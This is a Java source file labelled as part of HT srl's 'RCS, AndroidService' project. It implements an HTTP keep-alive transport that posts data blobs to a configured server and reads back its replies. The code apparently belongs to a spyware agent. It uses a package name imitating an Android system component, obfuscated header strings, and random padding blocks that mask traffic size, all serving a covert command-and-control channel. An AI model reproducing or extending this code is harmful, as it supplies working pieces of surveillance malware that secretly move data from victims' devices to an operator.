/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : HttpKeepAliveTransport.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.action.sync;

import java.io.DataInputStream;
import java.io.IOException;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.HttpVersion;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.ConnectionKeepAliveStrategy;
import org.apache.http.conn.params.ConnManagerParams;
import org.apache.http.conn.scheme.PlainSocketFactory;
import org.apache.http.conn.scheme.Scheme;
import org.apache.http.conn.scheme.SchemeRegistry;
import org.apache.http.cookie.Cookie;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.conn.tsccm.ThreadSafeClientConnManager;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.params.HttpProtocolParams;

import com.android.networking.Messages;
import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;
import com.android.networking.util.Utils;

public abstract class HttpKeepAliveTransport extends HttpTransport {
	private static final String TAG = "HttpKeepAliveTransport"; //$NON-NLS-1$
	DefaultHttpClient httpclient;

	private Statistics statistics;

	public HttpKeepAliveTransport(String host) {
		super(host);
		if (Cfg.STATISTICS) {
			statistics = new Statistics();
			statistics.start();
		}
	}

	/**
	 * http://www.androidsnippets.com/executing-a-http-post-request-with-
	 * httpclient
	 * 
	 * @param data
	 *            the data
	 * @return the byte[]
	 * @throws TransportException
	 *             the transport exception
	 */
	@Override
	public synchronized byte[] command(byte[] data) throws TransportException {
		if (Cfg.STATISTICS) {
			statistics.addOut(data.length);
		}

		if (Cfg.DEBUG) {
			Check.ensures(httpclient != null, "call startSession before command"); //$NON-NLS-1$
			// httpclient.getParams().setParameter(ClientPNames.COOKIE_POLICY,
			// CookiePolicy.RFC_2965);
		}

		final HttpPost httppost = new HttpPost(baseurl);

		httppost.setHeader(Messages.getString("3.0"), //$NON-NLS-1$
				Messages.getString("3.1")); //$NON-NLS-1$
		httppost.setHeader(Messages.getString("3.2"), Messages.getString("3.3")); //$NON-NLS-1$ //$NON-NLS-2$

		if (cookies != null) {
			for (final Cookie cookie : cookies) {
				httpclient.getCookieStore().addCookie(cookie);
				// httppost.setHeader("Cookie", cookie.getName());
			}
		}

		DataInputStream in = null;

		try {

			if (Cfg.PROTOCOL_RANDBLOCK) {
				byte[] randBlock = Utils.getRandomByteArray(1, 16);
				data = Utils.concat(data, randBlock);
			}

			httppost.setEntity(new ByteArrayEntity(data));
			final HttpResponse response = httpclient.execute(httppost);

			final int returnCode = response.getStatusLine().getStatusCode();

			if (returnCode == HttpStatus.SC_OK) {
				cookies = httpclient.getCookieStore().getCookies();

				long length = response.getEntity().getContentLength();
				if (Cfg.PROTOCOL_RANDBLOCK) {
					if (length % 16 > 0) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (command), dropping some bytes: " + length % 16);
						}
						length = length - (length % 16);
					}
				}

				in = new DataInputStream(response.getEntity().getContent());

				final byte[] content = new byte[(int) length];
				in.readFully(content);

				in.close();
				if (Cfg.STATISTICS) {
					statistics.addIn(content.length);
				}

				return content;
			} else {
				return null;
			}
		} catch (final Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + ex.toString());//$NON-NLS-1$
			}

			throw new TransportException(1);
		} finally {
			if (in != null) {
				try {
					in.close();
				} catch (final IOException e) {
					if (Cfg.EXCEPTION) {
						Check.log(e);
					}

					if (Cfg.DEBUG) {
						Check.log(e);//$NON-NLS-1$
					}
				}
			}
		}

		// byte[] content = parseHttpConnection(connection);

	}

	@Override
	public void start() {

		SchemeRegistry registry = new SchemeRegistry();
		registry.register(new Scheme("http", PlainSocketFactory.getSocketFactory(), 80));

		BasicHttpParams httpParameters = new BasicHttpParams();
		ConnManagerParams.setMaxTotalConnections(httpParameters, 100);
		// ConnManagerParams.setMaxConnectionsPerRoute(httpParameters, 10);
		HttpProtocolParams.setVersion(httpParameters, HttpVersion.HTTP_1_1);
		HttpProtocolParams.setUseExpectContinue(httpParameters, true);

		ThreadSafeClientConnManager connManager = new ThreadSafeClientConnManager(httpParameters, registry);

		// final HttpParams httpParameters = new BasicHttpParams();
		// Set the timeout in milliseconds until a connection is established.
		final int timeoutConnection = 30000;
		HttpConnectionParams.setConnectionTimeout(httpParameters, timeoutConnection);
		// Set the default socket timeout (SO_TIMEOUT)
		// in milliseconds which is the timeout for waiting for data.
		final int timeoutSocket = 30000;
		HttpConnectionParams.setSoTimeout(httpParameters, timeoutSocket);

		if (Cfg.PROTOCOL_KEEPALIVE) {
			httpclient = new DefaultHttpClient(connManager, httpParameters);
		} else {
			httpclient = new DefaultHttpClient(httpParameters);
		}

		httpclient.setKeepAliveStrategy(new ConnectionKeepAliveStrategy() {
			public long getKeepAliveDuration(HttpResponse response, org.apache.http.protocol.HttpContext context) {
				return 30000;
			}
		});
	}

	@Override
	public void close() {
		cookies = null;
		httpclient = null;
		if (Cfg.STATISTICS) {
			statistics.stop();
		}
	}
}
